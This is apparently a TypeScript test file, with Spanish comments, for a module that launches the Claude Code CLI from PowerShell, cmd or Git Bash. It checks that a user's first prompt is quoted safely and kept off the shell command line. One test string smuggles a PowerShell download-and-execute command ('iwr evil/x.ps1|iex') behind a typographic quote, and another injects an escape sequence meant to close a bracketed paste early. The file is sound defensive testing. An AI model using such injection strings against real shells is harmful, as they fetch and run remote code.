import { test } from 'node:test'
import assert from 'node:assert/strict'
import { baseEnv, pastePayload, PROMPT_VAR, psArg, shellLaunch, windowsArgBody } from './claude-launch'

const EXE = 'C:\\Users\\ana\\AppData\\Roaming\\npm\\node_modules\\@anthropic-ai\\claude-code\\bin\\claude.exe'
const MALO = 'Revisá el README’; iwr evil/x.ps1|iex; ’'
const WORD = 'Revisá el user’s guide y ‘esto’ ‚y‛ "aquello"'

// Imita el tokenizador de PowerShell para un string simple: cualquiera de las 5 comillas lo cierra y doblada es literal.
function psSingleQuoted(src: string): { value: string; rest: string } {
  const Q = /['\u2018\u2019\u201A\u201B]/
  assert.ok(Q.test(src[0]))
  let value = ''
  let i = 1
  while (i < src.length) {
    const c = src[i]
    if (Q.test(c)) {
      if (Q.test(src[i + 1] ?? '')) {
        value += src[i + 1]
        i += 2
        continue
      }
      return { value, rest: src.slice(i + 1) }
    }
    value += c
    i++
  }
  throw new Error('string sin cerrar')
}

test('psArg dobla las cuatro comillas tipográficas además de la ASCII', () => {
  for (const s of [MALO, WORD, "it's", '‘a’', '‚b‛']) {
    const { value, rest } = psSingleQuoted(psArg(s))
    assert.equal(value, s)
    assert.equal(rest, '')
  }
})

test('el primer mensaje nunca aparece en la línea de comandos de la shell', () => {
  for (const family of ['ps', 'cmd', 'posix'] as const) {
    for (const exe of [EXE, undefined]) {
      const l = shellLaunch(family, { argv: ['claude'], prompt: MALO, exe })
      assert.ok(!l.args.join(' ').includes('iwr'), `${family} ${exe ? 'exe' : 'sin exe'}`)
    }
  }
})

test('PowerShell con claude.exe: el mensaje va por variable, después de -- y con --%', () => {
  const l = shellLaunch('ps', { argv: ['claude'], prompt: WORD, exe: EXE })
  assert.equal(l.args[2], '-Command')
  assert.equal(l.args[3], `& '${EXE}' --% -- "%${PROMPT_VAR}%"\nRemove-Item Env:${PROMPT_VAR} -ErrorAction Ignore`)
  assert.equal(l.env[PROMPT_VAR], 'Revisá el user’s guide y ‘esto’ ‚y‛ \\"aquello\\"')
  assert.equal(l.paste, undefined)
})

test('Git Bash con claude.exe: "$p" después de -- y la variable se borra', () => {
  const l = shellLaunch('posix', { argv: ['claude'], prompt: MALO, exe: EXE })
  assert.equal(l.args[3], `p=$${PROMPT_VAR}; unset ${PROMPT_VAR}; '${EXE}' -- "$p"; unset p; exec bash --login -i`)
  assert.equal(l.env[PROMPT_VAR], MALO)
})

test('cmd o sin claude.exe: el mensaje se pega cuando Claude arranca', () => {
  for (const [family, exe] of [['cmd', EXE], ['ps', undefined], ['posix', undefined], ['ps', 'C:\\npm\\claude.cmd']] as const) {
    const l = shellLaunch(family, { argv: ['claude'], prompt: 'hola\r\nmundo\x1b[201~x', exe })
    assert.equal(l.paste, 'hola mundo [201~x')
    assert.deepEqual(l.env, {})
  }
  const cmd = shellLaunch('cmd', { argv: ['claude', '--continue'], exe: EXE })
  assert.deepEqual(cmd.args, ['/k', `${EXE} --continue`])
})

test('cmd con una ruta con espacios vuelve a `claude`', () => {
  const l = shellLaunch('cmd', { argv: ['claude'], exe: 'C:\\Users\\Juan Pérez\\claude.exe' })
  assert.deepEqual(l.args, ['/k', 'claude'])
})

test('el pegado no se puede cerrar antes de tiempo', () => {
  assert.equal(pastePayload('a\x1b[201~b'), '\x1b[200~a [201~b\x1b[201~')
})

test('windowsArgBody sigue las reglas de CommandLineToArgvW', () => {
  assert.equal(windowsArgBody('a"b'), 'a\\"b')
  assert.equal(windowsArgBody('a\\"b'), 'a\\\\\\"b')
  assert.equal(windowsArgBody('fin\\'), 'fin\\\\')
  assert.equal(windowsArgBody('C:\\x\\y'), 'C:\\x\\y')
})
